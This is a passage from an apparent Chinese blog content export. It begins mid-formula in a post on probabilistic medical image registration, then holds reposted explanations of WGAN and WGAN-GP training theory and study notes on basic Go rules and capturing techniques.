F_{x}^{i} ; F_{y}^{i}\right)=\mathcal{N}\left(z ; \mu_{F_{z}^{i} | F_{x}^{i} ; F_{y}^{i}}, \sigma_{F_{z}^{i} | F_{x}^{i}, F_{y}^{i}}^{2}\right)$$其中 $\mu_{F_{z}^{i} | F_{x}^{i} ; F_{y}^{i}}$ 是分布的均值，$\sigma_{F_{z}^{i} | F_{x}^{i}, F_{y}^{i}}^{2}$ 是分布的方差，它们是通过概率模型得到的（如图1(b)）。 $p(F_z^i)$ 和 $p(F_z^i|F_x^i;F_y^i)$ 符合以下多元正态分布：$$p\left(F_{z}^{i}\right)=\mathcal{N}\left(F_{z}^{i} ; 0, \sigma_{F_{z}^{i}}^{2}\right)$$ $$p\left(F_{y}^{i} | F_{z}^{i} ; F_{x}^{i}\right)=\mathcal{N}\left(F_{y}^{i} ; F_{x}^{i} \circ \phi_{F_{z}^{i}}, \sigma_{F^{i}}^{2}\right)$$ 其中 $\sigma_{F_z^i}^2$ 是分布的方差， $F_{x}^{i} \circ \phi_{F_{z}^{i}}$ 是噪音，$\sigma_{F^i}^2$ 是噪音项的方差。 在CNN浅层的特征图具有较高的分辨率并且具有丰富的细节信息，而CNN深层的特征图具有较低的分辨率并且具有高层次的语义信息。高层语义信息可以帮助全局配准，但是忽略了很多细节。而细节信息则是捕获了局部的配准信息。所以将浅层到深层的特征图 $F_z^i$ 混合得到最终的隐含变量 $z$，然后输入到 STN 中，对 moving image 进行变形。 模型总的损失为：$$\mathcal{D}{\text {total}}=\mathcal{L}(z ; x, y)+\sum{i=1}^n w_{i} \mathcal{L}\left(F_{z}^{i} ; F_{x}^{i}, F_{y}^{i}\right)$$其中，$\mathcal{L}(z;x,y)$ 表示从输入图像 $x$ 和 $y$ 到输出的配准后的图像 $z$ 的KL散度，$\mathcal{L}\left(F_{z}^{i} ; F_{x}^{i}, F_{y}^{i}\right)$ 是从输入特征图 $F_x^i$ 和 $F_y^i$ 到输出配准转换变量 $F_z^i$ 的KL散度。$n$ 是CNN的层数，$w_i$ 是第 $i$ 层损失的权重。通常设置$n=4,w_i=1$。基于KL散度的损失为：$$\mathcal{L}(Z ; X, Y)=\frac{1}{2 \sigma_{Z | X ; Y}^{2}}\left|Y-X \circ \phi_{Z}\right|^{2}+\frac{1}{2}\left[\operatorname{tr}\left(\sigma_{Z | X ; Y}^{2}\right)+\left|\mu_{Z | X ; Y}\right|-\log \operatorname{det}\left(\sigma_{Z | X ; Y}^{2}\right)\right]$$其中第一项是使得配准后的图像 $X\circ\phi_Z$ 与图像 $Y$ 相似的重建损失，第二项是公式1第一项的近似，它可以让 $q_\psi(Z|X;Y)$ 与 $p(Z)$ 相似；$\mu_{Z|X;Y}$ 和 $\sigma_{Z|X;Y}$ 分别是分布 $q_\psi(Z|X;Y)$ 的均值和标准差。 初始学习率为 $1e^{-4}$，并且周期性的减少（乘以0.1），一共有100个epoch，使用Adam优化器，优化器的第一个动量为0.9，第二个动量为0.999，衰减权重为0.0001。 下图是实验的结果对比图。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【转载】WGAN-GP：改进的加入gradient penalty的WGAN]]></title>
    <url>%2F2020%2F04%2F09%2Fwgan-gp%2F</url>
    <content type="text"><![CDATA[本文是转载的文章：WGAN-GP(改进的WGAN)介绍。 WGAN是一篇好文章，但是在处理Lipschitz条件时直接把weight限制住也带来了一些问题，很快改进版的WGAN-GP便问世了，本文将带着大家一起看看 WGAN-GP的原理。 WGAN-GP是针对WGAN的存在的问题提出来的，WGAN在真实的实验过程中依旧存在着训练困难、收敛速度慢的 问题，相比较传统GAN在实验上提升不是很明显。WGAN-GP在文章中指出了WGAN存在问题的原因，那就是WGAN在处理Lipschitz限制条件时直接采用了 weight clipping，就是每当更新完一次判别器的参数之后，就检查判别器的所有参数的绝对值有没有超过一个阈值，比如0.01，有的话就把这些参数 clip回 [-0.01, 0.01] 范围内。通过在训练过程中保证判别器的所有参数有界，就保证了判别器不能对两个略微不同的样本在判别上不会差异过大，从而 间接实现了Lipschitz限制。实际训练上判别器loss希望尽可能拉大真假样本的分数差，然而weight clipping独立地限制每一个网络参数的取值范围，在 这种情况下最优的策略就是尽可能让所有参数走极端，要么取最大值（如0.01）要么取最小值（如-0.01），文章通过实验验证了猜测如下图所示判别器的参 数几乎都集中在最大值和最小值上。 还有就是weight clipping会导致很容易一不小心就梯度消失或者梯度爆炸。原因是判别器是一个多层网络，如果把clipping threshold设得稍微小了一 点，每经过一层网络，梯度就变小一点点，多层之后就会指数衰减；反之，如果设得稍微大了一点，每经过一层网络，梯度变大一点点，多层之后就会指数爆 炸。只有设得不大不小，才能让生成器获得恰到好处的回传梯度，然而在实际应用中这个平衡区域可能很狭窄，就会给调参工作带来麻烦。文章也通过实验展 示了这个问题，下图中横轴代表判别器从低到高第几层，纵轴代表梯度回传到这一层之后的尺度大小（注意纵轴是对数刻度） 在以上问题提出后，作者提出了解决方案，那就是gradient penalty我翻译为梯度惩罚。Lipschitz限制是要求判别器的梯度不超过K，gradient penalty 就是设置一个额外的loss项来实现梯度与K之间的联系，这就是gradient penalty的核心所在，下图为引入gradient penalty后WGAN-GP的算法框图，对 于算法的分析我在附录中加以说明。 gradient penalty的选取并不是在全网络下，仅仅是在真假分布之间抽样处理，下图为处理过程。 下面公式展示为WGAN-GP的最终目标函数： WGAN-GP的创新点也就在目标函数的第二项上，由于模型是对每个样本独立地施加梯度惩罚，所以判别器的模型架构中不能使用Batch Normalization， 因为它会引入同个batch中不同样本的相互依赖关系。 小结：WGAN-GP指出了WGAN存在的两大问题，weight clipping导致的参数集中化和调参上的梯度爆炸和梯度消失问题，改进的gradient penalty解决 了问题将参数与限制联系起来达到真实的Lipschitz限制条件。但是理论归理论实际实验上WGAN-GP的效果并不尽如人意，实验结果还没有WGAN的效果好， 我感觉问题应该是出在了gradient penalty上，但是具体的证明我还没到功夫，以后有时间好好研读推导一下。以下是附录部分，大家可选择性参考。 附录 谢谢观看，希望对您有所帮助，欢迎指正错误，欢迎一起讨论！！！]]></content>
      <categories>
        <category>前人之述备矣</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【转载】令人拍案叫绝的Wasserstein GAN]]></title>
    <url>%2F2020%2F04%2F09%2Fwgan%2F</url>
    <content type="text"><![CDATA[本文是转载的知乎用户“郑华滨”的文章，原文链接为：令人拍案叫绝的Wasserstein GAN。 本文后续：Wasserstein GAN最新进展：从weight clipping到gradient penalty，更加先进的Lipschitz限制手法 在GAN的相关研究如火如荼甚至可以说是泛滥的今天，一篇新鲜出炉的arXiv论文《Wasserstein GAN》却在Reddit的Machine Learning频道火了，连Goodfellow都在帖子里和大家热烈讨论，这篇论文究竟有什么了不得的地方呢？ 要知道自从2014年Ian Goodfellow提出以来，GAN就存在着训练困难、生成器和判别器的loss无法指示训练进程、生成样本缺乏多样性等问题。从那时起，很多论文都在尝试解决，但是效果不尽人意，比如最有名的一个改进DCGAN依靠的是对判别器和生成器的架构进行实验枚举，最终找到一组比较好的网络架构设置，但是实际上是治标不治本，没有彻底解决问题。而今天的主角Wasserstein GAN（下面简称WGAN）成功地做到了以下爆炸性的几点： 彻底解决GAN训练不稳定的问题，不再需要小心平衡生成器和判别器的训练程度 基本解决了collapse mode的问题，确保了生成样本的多样性 训练过程中终于有一个像交叉熵、准确率这样的数值来指示训练的进程，这个数值越小代表GAN训练得越好，代表生成器产生的图像质量越高（如题图所示） 以上一切好处不需要精心设计的网络架构，最简单的多层全连接网络就可以做到 那以上好处来自哪里？这就是令人拍案叫绝的部分了——实际上作者整整花了两篇论文，在第一篇《Towards Principled Methods for Training Generative Adversarial Networks》里面推了一堆公式定理，从理论上分析了原始GAN的问题所在，从而针对性地给出了改进要点；在这第二篇《Wasserstein GAN》里面，又再从这个改进点出发推了一堆公式定理，最终给出了改进的算法实现流程，而改进后相比原始GAN的算法实现流程却只改了四点： 判别器最后一层去掉sigmoid 生成器和判别器的loss不取log 每次更新判别器的参数之后把它们的绝对值截断到不超过一个固定常数c 不要用基于动量的优化算法（包括momentum和Adam），推荐RMSProp，SGD也行 算法截图如下： 改动是如此简单，效果却惊人地好，以至于Reddit上不少人在感叹：就这样？没有别的了？ 太简单了吧！这些反应让我想起了一个颇有年头的鸡汤段子，说是一个工程师在电机外壳上用粉笔划了一条线排除了故障，要价一万美元——画一条线，1美元；知道在哪画线，9999美元。上面这四点改进就是作者Martin Arjovsky划的简简单单四条线，对于工程实现便已足够，但是知道在哪划线，背后却是精巧的数学分析，而这也是本文想要整理的内容。 本文内容分为五个部分： 原始GAN究竟出了什么问题？（此部分较长） WGAN之前的一个过渡解决方案 Wasserstein距离的优越性质 从Wasserstein距离到WGAN 总结 理解原文的很多公式定理需要对测度论、 拓扑学等数学知识有所掌握，本文会从直观的角度对每一个重要公式进行解读，有时通过一些低维的例子帮助读者理解数学背后的思想，所以不免会失于严谨，如有引喻不当之处，欢迎在评论中指出。 以下简称《Wassertein GAN》为“WGAN本作”，简称《Towards Principled Methods for Training Generative Adversarial Networks》为“WGAN前作”。 WGAN源码实现：martinarjovsky/WassersteinGAN 第一部分：原始GAN究竟出了什么问题？回顾一下，原始GAN中判别器要最小化如下损失函数，尽可能把真实样本分为正例，生成样本分为负例： （公式1 ） 其中是真实样本分布，是由生成器产生的样本分布。对于生成器，Goodfellow一开始提出来一个损失函数，后来又提出了一个改进的损失函数，分别是 （公式2） （公式3） 后者在WGAN两篇论文中称为“the - log D alternative”或“the - log D trick”。WGAN前作分别分析了这两种形式的原始GAN各自的问题所在，下面分别说明。 第一种原始GAN形式的问题一句话概括：判别器越好，生成器梯度消失越严重。WGAN前作从两个角度进行了论证，第一个角度是从生成器的等价损失函数切入的。 首先从公式1可以得到，在生成器G固定参数时最优的判别器D应该是什么。对于一个具体的样本，它可能来自真实分布也可能来自生成分布，它对公式1损失函数的贡献是 令其关于的导数为0，得 化简得最优判别器为： （公式4） 这个结果从直观上很容易理解，就是看一个样本来自真实分布和生成分布的可能性的相对比例。如果且，最优判别器就应该非常自信地给出概率0；如果，说明该样本是真是假的可能性刚好一半一半，此时最优判别器也应该给出概率0.5。 然而GAN训练有一个trick，就是别把判别器训练得太好，否则在实验中生成器会完全学不动（loss降不下去），为了探究背后的原因，我们就可以看看在极端情况——判别器最优时，生成器的损失函数变成什么。给公式2加上一个不依赖于生成器的项，使之变成 注意，最小化这个损失函数等价于最小化公式2，而且它刚好是判别器损失函数的反。代入最优判别器即公式4，再进行简单的变换可以得到 （公式5) 变换成这个样子是为了引入Kullback–Leibler divergence（简称KL散度）和Jensen-Shannon divergence（简称JS散度）这两个重要的相似度衡量指标，后面的主角之一Wasserstein距离，就是要来吊打它们两个的。所以接下来介绍这两个重要的配角——KL散度和JS散度： （公式6） （公式7） 于是公式5就可以继续写成 （公式8） 到这里读者可以先喘一口气，看看目前得到了什么结论：根据原始GAN定义的判别器loss，我们可以得到最优判别器的形式；而在最优判别器的下，我们可以把原始GAN定义的生成器loss等价变换为最小化真实分布与生成分布之间的JS散度。我们越训练判别器，它就越接近最优，最小化生成器的loss也就会越近似于最小化和之间的JS散度。 问题就出在这个JS散度上。我们会希望如果两个分布之间越接近它们的JS散度越小，我们通过优化JS散度就能将“拉向”，最终以假乱真。这个希望在两个分布有所重叠的时候是成立的，但是如果两个分布完全没有重叠的部分，或者它们重叠的部分可忽略（下面解释什么叫可忽略），它们的JS散度是多少呢？ 答案是，因为对于任意一个x只有四种可能： 且 且 且 且 第一种对计算JS散度无贡献，第二种情况由于重叠部分可忽略所以贡献也为0，第三种情况对公式7右边第一个项的贡献是，第四种情况与之类似，所以最终。 换句话说，无论跟是远在天边，还是近在眼前，只要它们俩没有一点重叠或者重叠部分可忽略，JS散度就固定是常数，而这对于梯度下降方法意味着——梯度为0！此时对于最优判别器来说，生成器肯定是得不到一丁点梯度信息的；即使对于接近最优的判别器来说，生成器也有很大机会面临梯度消失的问题。 但是与不重叠或重叠部分可忽略的可能性有多大？不严谨的答案是：非常大。比较严谨的答案是：当与的支撑集（support）是高维空间中的低维流形（manifold）时，与重叠部分测度（measure）为0的概率为1。 不用被奇怪的术语吓得关掉页面，虽然论文给出的是严格的数学表述，但是直观上其实很容易理解。首先简单介绍一下这几个概念： 支撑集（support）其实就是函数的非零部分子集，比如ReLU函数的支撑集就是，一个概率分布的支撑集就是所有概率密度非零部分的集合。 流形（manifold）是高维空间中曲线、曲面概念的拓广，我们可以在低维上直观理解这个概念，比如我们说三维空间中的一个曲面是一个二维流形，因为它的本质维度（intrinsic dimension）只有2，一个点在这个二维流形上移动只有两个方向的自由度。同理，三维空间或者二维空间中的一条曲线都是一个一维流形。 测度（measure）是高维空间中长度、面积、体积概念的拓广，可以理解为“超体积”。 回过头来看第一句话，“当与的支撑集是高维空间中的低维流形时”，基本上是成立的。原因是GAN中的生成器一般是从某个低维（比如100维）的随机分布中采样出一个编码向量，再经过一个神经网络生成出一个高维样本（比如64x64的图片就有4096维）。当生成器的参数固定时，生成样本的概率分布虽然是定义在4096维的空间上，但它本身所有可能产生的变化已经被那个100维的随机分布限定了，其本质维度就是100，再考虑到神经网络带来的映射降维，最终可能比100还小，所以生成样本分布的支撑集就在4096维空间中构成一个最多100维的低维流形，“撑不满”整个高维空间。 “撑不满”就会导致真实分布与生成分布难以“碰到面”，这很容易在二维空间中理解：一方面，二维平面中随机取两条曲线，它们之间刚好存在重叠线段的概率为0；另一方面，虽然它们很大可能会存在交叉点，但是相比于两条曲线而言，交叉点比曲线低一个维度，长度（测度）为0，可忽略。三维空间中也是类似的，随机取两个曲面，它们之间最多就是比较有可能存在交叉线，但是交叉线比曲面低一个维度，面积（测度）是0，可忽略。从低维空间拓展到高维空间，就有了如下逻辑：因为一开始生成器随机初始化，所以几乎不可能与有什么关联，所以它们的支撑集之间的重叠部分要么不存在，要么就比和的最小维度还要低至少一个维度，故而测度为0。所谓“重叠部分测度为0”，就是上文所言“不重叠或者重叠部分可忽略”的意思。 我们就得到了WGAN前作中关于生成器梯度消失的第一个论证：在（近似）最优判别器下，最小化生成器的loss等价于最小化与之间的JS散度，而由于与几乎不可能有不可忽略的重叠，所以无论它们相距多远JS散度都是常数，最终导致生成器的梯度（近似）为0，梯度消失。 接着作者写了很多公式定理从第二个角度进行论证，但是背后的思想也可以直观地解释： 首先，与之间几乎不可能有不可忽略的重叠，所以无论它们之间的“缝隙”多狭小，都肯定存在一个最优分割曲面把它们隔开，最多就是在那些可忽略的重叠处隔不开而已。 由于判别器作为一个神经网络可以无限拟合这个分隔曲面，所以存在一个最优判别器，对几乎所有真实样本给出概率1，对几乎所有生成样本给出概率0，而那些隔不开的部分就是难以被最优判别器分类的样本，但是它们的测度为0，可忽略。 最优判别器在真实分布和生成分布的支撑集上给出的概率都是常数（1和0），导致生成器的loss梯度为0，梯度消失。 有了这些理论分析，原始GAN不稳定的原因就彻底清楚了：判别器训练得太好，生成器梯度消失，生成器loss降不下去；判别器训练得不好，生成器梯度不准，四处乱跑。只有判别器训练得不好不坏才行，但是这个火候又很难把握，甚至在同一轮训练的前后不同阶段这个火候都可能不一样，所以GAN才那么难训练。 实验辅证如下： WGAN前作Figure 2。先分别将DCGAN训练1，20，25个epoch，然后固定生成器不动，判别器重新随机初始化从头开始训练，对于第一种形式的生成器loss产生的梯度可以打印出其尺度的变化曲线，可以看到随着判别器的训练，生成器的梯度均迅速衰减。注意y轴是对数坐标轴。 第二种原始GAN形式的问题一句话概括：最小化第二种生成器loss函数，会等价于最小化一个不合理的距离衡量，导致两个问题，一是梯度不稳定，二是collapse mode即多样性不足。WGAN前作又是从两个角度进行了论证，下面只说第一个角度，因为对于第二个角度我难以找到一个直观的解释方式，感兴趣的读者还是去看论文吧（逃）。 如前文所说，Ian Goodfellow提出的“- log D trick”是把生成器loss改成 （公式3） 上文推导已经得到在最优判别器下 （公式9） 我们可以把KL散度（注意下面是先g后r）变换成含的形式： （公式10） 由公式3，9，10可得最小化目标的等价变形 注意上式最后两项不依赖于生成器G，最终得到最小化公式3等价于最小化 （公式11） 这个等价最小化目标存在两个严重的问题。第一是它同时要最小化生成分布与真实分布的KL散度，却又要最大化两者的JS散度，一个要拉近，一个却要推远！这在直观上非常荒谬，在数值上则会导致梯度不稳定，这是后面那个JS散度项的毛病。 第二，即便是前面那个正常的KL散度项也有毛病。因为KL散度不是一个对称的衡量，与是有差别的。以前者为例 当而时，，对贡献趋近0 当而时，，对贡献趋近正无穷 换言之，对于上面两种错误的惩罚是不一样的，第一种错误对应的是“生成器没能生成真实的样本”，惩罚微小；第二种错误对应的是“生成器生成了不真实的样本” ，惩罚巨大。第一种错误对应的是缺乏多样性，第二种错误对应的是缺乏准确性。这一放一打之下，生成器宁可多生成一些重复但是很“安全”的样本，也不愿意去生成多样性的样本，因为那样一不小心就会产生第二种错误，得不偿失。这种现象就是大家常说的collapse mode。 第一部分小结：在原始GAN的（近似）最优判别器下，第一种生成器loss面临梯度消失问题，第二种生成器loss面临优化目标荒谬、梯度不稳定、对多样性与准确性惩罚不平衡导致mode collapse这几个问题。 实验辅证如下： WGAN前作Figure 3。先分别将DCGAN训练1，20，25个epoch，然后固定生成器不动，判别器重新随机初始化从头开始训练，对于第二种形式的生成器loss产生的梯度可以打印出其尺度的变化曲线，可以看到随着判别器的训练，蓝色和绿色曲线中生成器的梯度迅速增长，说明梯度不稳定，红线对应的是DCGAN相对收敛的状态，梯度才比较稳定。 第二部分：WGAN之前的一个过渡解决方案原始GAN问题的根源可以归结为两点，一是等价优化的距离衡量（KL散度、JS散度）不合理，二是生成器随机初始化后的生成分布很难与真实分布有不可忽略的重叠。 WGAN前作其实已经针对第二点提出了一个解决方案，就是对生成样本和真实样本加噪声，直观上说，使得原本的两个低维流形“弥散”到整个高维空间，强行让它们产生不可忽略的重叠。而一旦存在重叠，JS散度就能真正发挥作用，此时如果两个分布越靠近，它们“弥散”出来的部分重叠得越多，JS散度也会越小而不会一直是一个常数，于是（在第一种原始GAN形式下）梯度消失的问题就解决了。在训练过程中，我们可以对所加的噪声进行退火（annealing），慢慢减小其方差，到后面两个低维流形“本体”都已经有重叠时，就算把噪声完全拿掉，JS散度也能照样发挥作用，继续产生有意义的梯度把两个低维流形拉近，直到它们接近完全重合。以上是对原文的直观解释。 在这个解决方案下我们可以放心地把判别器训练到接近最优，不必担心梯度消失的问题。而当判别器最优时，对公式9取反可得判别器的最小loss为 其中和分别是加噪后的真实分布与生成分布。反过来说，从最优判别器的loss可以反推出当前两个加噪分布的JS散度。两个加噪分布的JS散度可以在某种程度上代表两个原本分布的距离，也就是说可以通过最优判别器的loss反映训练进程！……真的有这样的好事吗？ 并没有，因为加噪JS散度的具体数值受到噪声的方差影响，随着噪声的退火，前后的数值就没法比较了，所以它不能成为和距离的本质性衡量。 因为本文的重点是WGAN本身，所以WGAN前作的加噪方案简单介绍到这里，感兴趣的读者可以阅读原文了解更多细节。加噪方案是针对原始GAN问题的第二点根源提出的，解决了训练不稳定的问题，不需要小心平衡判别器训练的火候，可以放心地把判别器训练到接近最优，但是仍然没能够提供一个衡量训练进程的数值指标。但是WGAN本作就从第一点根源出发，用Wasserstein距离代替JS散度，同时完成了稳定训练和进程指标的问题！ 作者未对此方案进行实验验证。 第三部分：Wasserstein距离的优越性质Wasserstein距离又叫Earth-Mover（EM）距离，定义如下： （公式12） 解释如下：是和组合起来的所有可能的联合分布的集合，反过来说，中每一个分布的边缘分布都是和。对于每一个可能的联合分布而言，可以从中采样得到一个真实样本和一个生成样本，并算出这对样本的距离，所以可以计算该联合分布下样本对距离的期望值。在所有可能的联合分布中能够对这个期望值取到的下界，就定义为Wasserstein距离。 直观上可以把理解为在这个“路径规划”下把这堆“沙土”挪到“位置”所需的“消耗”，而就是“最优路径规划”下的“最小消耗”，所以才叫Earth-Mover（推土机）距离。 Wasserstein距离相比KL散度、JS散度的优越性在于，即便两个分布没有重叠，Wasserstein距离仍然能够反映它们的远近。WGAN本作通过简单的例子展示了这一点。考虑如下二维空间中的两个分布和，在线段AB上均匀分布，在线段CD上均匀分布，通过控制参数可以控制着两个分布的距离远近。 此时容易得到（读者可自行验证） （突变） （突变） （平滑） KL散度和JS散度是突变的，要么最大要么最小，Wasserstein距离却是平滑的，如果我们要用梯度下降法优化这个参数，前两者根本提供不了梯度，Wasserstein距离却可以。类似地，在高维空间中如果两个分布不重叠或者重叠部分可忽略，则KL和JS既反映不了远近，也提供不了梯度，但是Wasserstein却可以提供有意义的梯度。 第四部分：从Wasserstein距离到WGAN既然Wasserstein距离有如此优越的性质，如果我们能够把它定义为生成器的loss，不就可以产生有意义的梯度来更新生成器，使得生成分布被拉向真实分布吗？ 没那么简单，因为Wasserstein距离定义（公式12）中的没法直接求解，不过没关系，作者用了一个已有的定理把它变换为如下形式 （公式13） 证明过程被作者丢到论文附录中了，我们也姑且不管，先看看上式究竟说了什么。 首先需要介绍一个概念——Lipschitz连续。它其实就是在一个连续函数上面额外施加了一个限制，要求存在一个常数使得定义域内的任意两个元素和都满足 此时称函数的Lipschitz常数为。 简单理解，比如说的定义域是实数集合，那上面的要求就等价于的导函数绝对值不超过。再比如说就不是Lipschitz连续，因为它的导函数没有上界。Lipschitz连续条件限制了一个连续函数的最大局部变动幅度。 公式13的意思就是在要求函数的Lipschitz常数不超过的条件下，对所有可能满足条件的取到的上界，然后再除以。特别地，我们可以用一组参数来定义一系列可能的函数，此时求解公式13可以近似变成求解如下形式 （公式14） 再用上我们搞深度学习的人最熟悉的那一套，不就可以把用一个带参数的神经网络来表示嘛！由于神经网络的拟合能力足够强大，我们有理由相信，这样定义出来的一系列虽然无法囊括所有可能，但是也足以高度近似公式13要求的那个了。 最后，还不能忘了满足公式14中这个限制。我们其实不关心具体的K是多少，只要它不是正无穷就行，因为它只是会使得梯度变大倍，并不会影响梯度的方向。所以作者采取了一个非常简单的做法，就是限制神经网络的所有参数的不超过某个范围，比如，此时关于输入样本的导数也不会超过某个范围，所以一定存在某个不知道的常数使得的局部变动幅度不会超过它，Lipschitz连续条件得以满足。具体在算法实现中，只需要每次更新完后把它clip回这个范围就可以了。 到此为止，我们可以构造一个含参数、最后一层不是非线性激活层的判别器网络，在限制不超过某个范围的条件下，使得 （公式15） 尽可能取到最大，此时就会近似真实分布与生成分布之间的Wasserstein距离（忽略常数倍数）。注意原始GAN的判别器做的是真假二分类任务，所以最后一层是sigmoid，但是现在WGAN中的判别器做的是近似拟合Wasserstein距离，属于回归任务，所以要把最后一层的sigmoid拿掉。 接下来生成器要近似地最小化Wasserstein距离，可以最小化，由于Wasserstein距离的优良性质，我们不需要担心生成器梯度消失的问题。再考虑到的第一项与生成器无关，就得到了WGAN的两个loss。 （公式16，WGAN生成器loss函数） （公式17，WGAN判别器loss函数） 公式15是公式17的反，可以指示训练进程，其数值越小，表示真实分布与生成分布的Wasserstein距离越小，GAN训练得越好。 WGAN完整的算法流程已经贴过了，为了方便读者此处再贴一遍： 上文说过，WGAN与原始GAN第一种形式相比，只改了四点： 判别器最后一层去掉sigmoid 生成器和判别器的loss不取log 每次更新判别器的参数之后把它们的绝对值截断到不超过一个固定常数c 不要用基于动量的优化算法（包括momentum和Adam），推荐RMSProp，SGD也行 前三点都是从理论分析中得到的，已经介绍完毕；第四点却是作者从实验中发现的，属于trick，相对比较“玄”。作者发现如果使用Adam，判别器的loss有时候会崩掉，当它崩掉时，Adam给出的更新方向与梯度方向夹角的cos值就变成负数，更新方向与梯度方向南辕北辙，这意味着判别器的loss梯度是不稳定的，所以不适合用Adam这类基于动量的优化算法。作者改用RMSProp之后，问题就解决了，因为RMSProp适合梯度不稳定的情况。 对WGAN作者做了不少实验验证，本文只提比较重要的三点。第一，判别器所近似的Wasserstein距离与生成器的生成图片质量高度相关，如下所示（此即题图）： 第二，WGAN如果用类似DCGAN架构，生成图片的效果与DCGAN差不多： 但是厉害的地方在于WGAN不用DCGAN各种特殊的架构设计也能做到不错的效果，比如如果大家一起拿掉Batch Normalization的话，DCGAN就崩了： 如果WGAN和原始GAN都使用多层全连接网络（MLP），不用CNN，WGAN质量会变差些，但是原始GAN不仅质量变得更差，而且还出现了collapse mode，即多样性不足： 第三，在所有WGAN的实验中未观察到collapse mode，作者也只说应该是解决了， 最后补充一点论文没提到，但是我个人觉得比较微妙的问题。判别器所近似的Wasserstein距离能够用来指示单次训练中的训练进程，这个没错；接着作者又说它可以用于比较多次训练进程，指引调参，我倒是觉得需要小心些。比如说我下次训练时改了判别器的层数、节点数等超参，判别器的拟合能力就必然有所波动，再比如说我下次训练时改了生成器两次迭代之间，判别器的迭代次数，这两种常见的变动都会使得Wasserstein距离的拟合误差就与上次不一样。那么这个拟合误差的变动究竟有多大，或者说不同的人做实验时判别器的拟合能力或迭代次数相差实在太大，那它们之间还能不能直接比较上述指标，我都是存疑的。 评论区的知友 @Minjie Xu 进一步指出，相比于判别器迭代次数的改变，这是需要在实际应用中注意的。对此我想到了一个工程化的解决方式，不是很优雅：取同样一对生成分布和真实分布，让前后两个不同架构的判别器各自拟合到收敛，看收敛到的指标差多少倍，可以近似认为是后面的相对前面的变化倍数，于是就可以用这个变化倍数校正前后两轮训练的指标。 第五部分：总结WGAN前作分析了Ian Goodfellow提出的原始GAN两种形式各自的问题，第一种形式等价在最优判别器下等价于最小化生成分布与真实分布之间的JS散度，由于随机生成分布很难与真实分布有不可忽略的重叠以及JS散度的突变特性，使得生成器面临梯度消失的问题；第二种形式在最优判别器下等价于既要最小化生成分布与真实分布直接的KL散度，又要最大化其JS散度，相互矛盾，导致梯度不稳定，而且KL散度的不对称性使得生成器宁可丧失多样性也不愿丧失准确性，导致collapse mode现象。 WGAN前作针对分布重叠问题提出了一个过渡解决方案，通过对生成样本和真实样本加噪声使得两个分布产生重叠，理论上可以解决训练不稳定的问题，可以放心训练判别器到接近最优，但是未能提供一个指示训练进程的可靠指标，也未做实验验证。 WGAN本作引入了Wasserstein距离，由于它相对KL散度与JS散度具有优越的平滑特性，理论上可以解决梯度消失问题。接着通过数学变换将Wasserstein距离写成可求解的形式，利用一个参数数值范围受限的判别器神经网络来最大化这个形式，就可以近似Wasserstein距离。在此近似最优判别器下优化生成器使得Wasserstein距离缩小，就能有效拉近生成分布与真实分布。WGAN既解决了训练不稳定的问题，也提供了一个可靠的训练进程指标，而且该指标确实与生成样本的质量高度相关。作者对WGAN进行了实验验证。]]></content>
      <categories>
        <category>前人之述备矣</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《聂卫平围棋道场之小喵小汪学围棋》系列视频笔记]]></title>
    <url>%2F2020%2F04%2F09%2FGo%2F</url>
    <content type="text"><![CDATA[本文是《聂卫平围棋道场之小喵小汪学围棋》系列视频的笔记。 围棋棋盘有19*19=361个点，其中9个特殊点被称为“星位”，最中间的点被称为“天元”。下棋时黑先白后，用食指和中指夹住棋子，食指在下中指在上。 与棋子直线最近的四个交点才产生“气”，当另一色的棋子下在当前棋子的“气”上时，气就消失了，当棋子没有气时就需要从棋盘上拿走。同色棋子相连，气可以共用。 猜先：一人手握数个棋子，另一人猜棋子是单数还是双数，若猜单数则放1个棋子在棋盘上，反之放2个。若猜对则执黑先行。 一个棋子从两口气变为只剩下一口气则被称为“打吃”。通过增加棋子使相连棋子的气增多的过程被称为“长”，一个棋子从一口气变为没有气时被称为“提子”，这时需要立刻把气为0的棋子拿出棋盘。 如果把落子后棋子只剩下一口气的交叉点称为“虎口”。一个棋子落子后如果没有气，又不能吃掉对方棋子的则称为禁入点，不能下。但是如果棋子落下后没有气，但是可以吃掉对方的棋子而使其有气，则可以下。 双方能够反复提子和被提子（来回吃子）的棋型成为打劫。当出现打劫时，一方提子后另一方不能立刻提子，如果立刻反提则犯规，罚停一手。打二还一是指一方可以吃掉两子，而另一方只能反提一子的棋型，这时可以立即反提而不犯规，不会发生反复提子。 围棋的胜负是看谁围住的地盘多，可以通过吃子和挡住对方两个方法来增加地盘。 棋盘上由横线和竖线相连的同色棋子称作一块棋子，通过下子使两块棋合成一块，使得棋子的气变多成为连接，也可以通过落子使得棋子出现虎口而连接。断点是使自己可以连接或对方可以分断的点位，下在这可以让对方棋子的气变少，这个过程称为分断。 棋子的断点越多，气少的棋子就越危险。双打吃就是找到两块有两口气的棋子，下在它们的断点上，两边都出现打吃的情况，总有一边是逃不掉的。 征吃也叫征子或扭羊头，通过多步来吃掉对方的棋子，从哪边逃跑就从哪边征吃，注意不能让对方有三口或三口以上的气（按块数），有接应的棋子不能征吃，自己棋子被打吃的时候不能征吃。 当可以征吃的时候叫做“征子有利”，反之叫做“征子不利”，棋盘最外面的一圈叫做“一路线”，次外面的一圈叫做“二路线”，依此类推。当对方下在二路线的时候就不必用从哪边逃跑就从哪边打吃的方法了，将对方打吃到一路线即可。自己棋子被征吃时且跑不掉时，就不要继续逃跑了，应该转而保护其他棋子。 枷吃就是锁住对方的棋子，让其跑不掉，枷吃要在对方两条逃跑路线中间的位置来落子，然后对方往哪边跑就往哪边堵他。参与枷吃的棋子要比被加持的棋子气更多。多个棋子可以往同一个方向跑时算作一个方向。 故意在对方虎口中落子而吃掉对方棋子的方法叫做扑，要下在对方既是虎口又是断点的地方，让对方吃掉我们这口棋，再吃掉对方的棋，叫倒扑。 接不归就是在打吃对方棋子的时候，即使对方把棋连接起来气还是很少。 边线吃子就是指在1、2、3路线上的吃子技巧，将对方从3路线赶到2路线再赶到1路线的吃子技巧。 在分断的同时打吃，叫做断打，又叫关门吃（门吃），关门吃子最得意，卡住棋子剩一气。将对方棋子抱在怀里怎么都跑不掉的吃子方法叫抱吃。 逃跑时要先判断棋子是否能跑掉，确定能逃跑的时候可以通过攻击对方气少的棋子来逃跑，反之应该尽可能减少损失。 